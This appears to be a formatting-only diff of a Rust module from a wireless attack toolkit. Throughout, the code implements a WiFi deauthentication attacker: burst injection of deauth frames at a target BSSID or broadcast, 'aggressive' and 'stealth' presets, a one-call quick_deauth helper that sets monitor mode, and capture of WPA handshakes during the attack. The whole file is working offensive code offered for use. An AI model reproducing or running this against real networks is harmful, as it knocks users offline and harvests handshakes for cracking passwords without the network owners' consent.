@@ -8,12 +8,12 @@ use std::sync::Arc;
 use std::thread;
 use std::time::{Duration, Instant};
 
-use crate::error::{WirelessError, Result};
+use crate::capture::{CaptureFilter, CapturedPacket, PacketCapture};
+use crate::error::{Result, WirelessError};
 use crate::frames::{DeauthFrame, DeauthReason, MacAddress};
-use crate::interface::WirelessInterface;
-use crate::inject::{Injector, InjectionStats};
-use crate::capture::{PacketCapture, CaptureFilter, CapturedPacket};
 use crate::handshake::HandshakeCapture;
+use crate::inject::{InjectionStats, Injector};
+use crate::interface::WirelessInterface;
 
 /// Deauthentication attack configuration
 #[derive(Debug, Clone)]
@@ -59,7 +59,7 @@ impl DeauthConfig {
             ..Default::default()
         }
     }
-    
+
     /// Aggressive attack config
     pub fn aggressive() -> Self {
         Self {
@@ -68,7 +68,7 @@ impl DeauthConfig {
             ..Default::default()
         }
     }
-    
+
     /// Stealth attack config (fewer packets, longer intervals)
     pub fn stealth() -> Self {
         Self {
@@ -77,13 +77,13 @@ impl DeauthConfig {
             ..Default::default()
         }
     }
-    
+
     /// Set duration
     pub fn with_duration(mut self, duration: Duration) -> Self {
         self.duration = duration;
         self
     }
-    
+
     /// Set packets per burst
     pub fn with_packets(mut self, packets: u32) -> Self {
         self.packets_per_burst = packets;
@@ -132,16 +132,16 @@ impl DeauthAttacker {
     pub fn new(interface: &WirelessInterface) -> Result<Self> {
         if !interface.is_monitor_mode()? {
             return Err(WirelessError::MonitorMode(
-                "Interface must be in monitor mode for deauth attack".into()
+                "Interface must be in monitor mode for deauth attack".into(),
             ));
         }
-        
+
         Ok(Self {
             interface_name: interface.name().to_string(),
             injector: Injector::from_interface(interface)?,
         })
     }
-    
+
     /// Create from interface name (assumes already in monitor mode)
     pub fn from_name(name: &str) -> Result<Self> {
         Ok(Self {
@@ -149,7 +149,7 @@ impl DeauthAttacker {
             injector: Injector::new(name)?,
         })
     }
-    
+
     /// Execute deauth attack
     pub fn attack(
         &mut self,
@@ -160,61 +160,71 @@ impl DeauthAttacker {
         log::info!(
             "Starting deauth attack on BSSID {} (client: {})",
             bssid,
-            client.map(|c| c.to_string()).unwrap_or_else(|| "broadcast".to_string())
+            client
+                .map(|c| c.to_string())
+                .unwrap_or_else(|| "broadcast".to_string())
         );
-        
+
         let mut stats = DeauthStats::default();
         let start = Instant::now();
         let stop_flag = Arc::new(AtomicBool::new(false));
-        
+
         // Optional: Start handshake capture in background thread
         let handshake_state = if config.capture_handshake {
-            Some(Arc::new(std::sync::Mutex::new(HandshakeCapture::new(bssid, client))))
+            Some(Arc::new(std::sync::Mutex::new(HandshakeCapture::new(
+                bssid, client,
+            ))))
         } else {
             None
         };
-        
+
         // Main attack loop
         while start.elapsed() < config.duration && !stop_flag.load(Ordering::Relaxed) {
             // Send deauth burst
             let result = self.send_deauth_burst(bssid, client, &config)?;
-            
+
             stats.packets_sent += result.sent as u64;
             stats.failed_packets += result.failed;
             stats.bytes_sent += result.bytes;
             stats.bursts += 1;
-            
+
             log::debug!(
                 "Burst {}: sent {} packets ({} failed)",
-                stats.bursts, result.sent, result.failed
+                stats.bursts,
+                result.sent,
+                result.failed
             );
-            
+
             // Wait before next burst
             if start.elapsed() + config.burst_interval < config.duration {
                 thread::sleep(config.burst_interval);
             }
         }
-        
+
         stats.duration = start.elapsed();
-        
+
         // Check if handshake was captured
         if let Some(ref hs) = handshake_state {
             if let Ok(guard) = hs.lock() {
                 stats.handshake_captured = guard.is_complete();
             }
         }
-        
+
         log::info!(
             "Deauth attack complete: {} packets in {} bursts over {:.1}s (handshake: {})",
             stats.packets_sent,
             stats.bursts,
             stats.duration.as_secs_f32(),
-            if stats.handshake_captured { "captured" } else { "not captured" }
+            if stats.handshake_captured {
+                "captured"
+            } else {
+                "not captured"
+            }
         );
-        
+
         Ok(stats)
     }
-    
+
     /// Execute attack with real-time capture
     pub fn attack_with_capture(
         &mut self,
@@ -223,18 +233,18 @@ impl DeauthAttacker {
         config: DeauthConfig,
     ) -> Result<(DeauthStats, Vec<CapturedPacket>)> {
         log::info!("Starting deauth attack with capture");
-        
+
         let mut stats = DeauthStats::default();
         let mut captured_packets = Vec::new();
         let start = Instant::now();
-        
+
         // Create capture socket
         let mut capture = PacketCapture::new(&self.interface_name)?;
         capture.set_filter(CaptureFilter::for_bssid(bssid).with_bssid(bssid));
-        
+
         // Handshake tracker
         let mut handshake = HandshakeCapture::new(bssid, client);
-        
+
         while start.elapsed() < config.duration {
             // Send deauth burst
             let result = self.send_deauth_burst(bssid, client, &config)?;
@@ -242,7 +252,7 @@ impl DeauthAttacker {
             stats.failed_packets += result.failed;
             stats.bytes_sent += result.bytes;
             stats.bursts += 1;
-            
+
             // Capture packets during burst interval
             let capture_until = Instant::now() + config.burst_interval;
             while Instant::now() < capture_until {
@@ -251,11 +261,11 @@ impl DeauthAttacker {
                         stats.eapol_frames += 1;
                         handshake.process_packet(&packet);
                         captured_packets.push(packet);
-                        
+
                         if handshake.is_complete() {
                             log::info!("Handshake captured!");
                             stats.handshake_captured = true;
-                            
+
                             if config.stop_on_handshake {
                                 stats.duration = start.elapsed();
                                 return Ok((stats, captured_packets));
@@ -265,13 +275,13 @@ impl DeauthAttacker {
                 }
             }
         }
-        
+
         stats.duration = start.elapsed();
         stats.handshake_captured = handshake.is_complete();
-        
+
         Ok((stats, captured_packets))
     }
-    
+
     /// Send a single deauth burst
     fn send_deauth_burst(
         &mut self,
@@ -279,14 +289,10 @@ impl DeauthAttacker {
         client: Option<MacAddress>,
         config: &DeauthConfig,
     ) -> Result<InjectionStats> {
-        self.injector.inject_deauth_burst(
-            bssid,
-            client,
-            config.reason,
-            config.packets_per_burst,
-        )
+        self.injector
+            .inject_deauth_burst(bssid, client, config.reason, config.packets_per_burst)
     }
-    
+
     /// Send single deauth frame
     pub fn send_deauth(
         &mut self,
@@ -297,7 +303,7 @@ impl DeauthAttacker {
         let mut frame = DeauthFrame::from_ap(bssid, client, reason);
         self.injector.inject_deauth(&mut frame)
     }
-    
+
     /// Broadcast deauth to all clients
     pub fn broadcast_deauth(&mut self, bssid: MacAddress, reason: DeauthReason) -> Result<usize> {
         self.send_deauth(bssid, MacAddress::BROADCAST, reason)
@@ -312,44 +318,44 @@ pub fn quick_deauth(
     duration_secs: u64,
 ) -> Result<DeauthStats> {
     // Parse BSSID
-    let bssid: MacAddress = bssid.parse()
+    let bssid: MacAddress = bssid
+        .parse()
         .map_err(|e| WirelessError::InvalidMac(format!("{}", e)))?;
-    
+
     // Setup interface
     let mut iface = WirelessInterface::new(interface)?;
     iface.set_monitor_mode()?;
     iface.set_channel(channel)?;
-    
+
     // Run attack
     let mut attacker = DeauthAttacker::new(&iface)?;
-    let config = DeauthConfig::default()
-        .with_duration(Duration::from_secs(duration_secs));
-    
+    let config = DeauthConfig::default().with_duration(Duration::from_secs(duration_secs));
+
     let stats = attacker.attack(bssid, None, config)?;
-    
+
     // Cleanup
     iface.set_managed_mode()?;
-    
+
     Ok(stats)
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
-    
+
     #[test]
     fn test_deauth_config() {
         let config = DeauthConfig::default();
         assert_eq!(config.packets_per_burst, 64);
         assert_eq!(config.duration, Duration::from_secs(120));
-        
+
         let quick = DeauthConfig::quick();
         assert_eq!(quick.duration, Duration::from_secs(30));
-        
+
         let aggressive = DeauthConfig::aggressive();
         assert_eq!(aggressive.packets_per_burst, 128);
     }
-    
+
     #[test]
     fn test_deauth_stats() {
         let stats = DeauthStats {
@@ -357,7 +363,7 @@ mod tests {
             duration: Duration::from_secs(10),
             ..Default::default()
         };
-        
+
         assert!((stats.packets_per_second() - 100.0).abs() < 0.01);
     }
 }
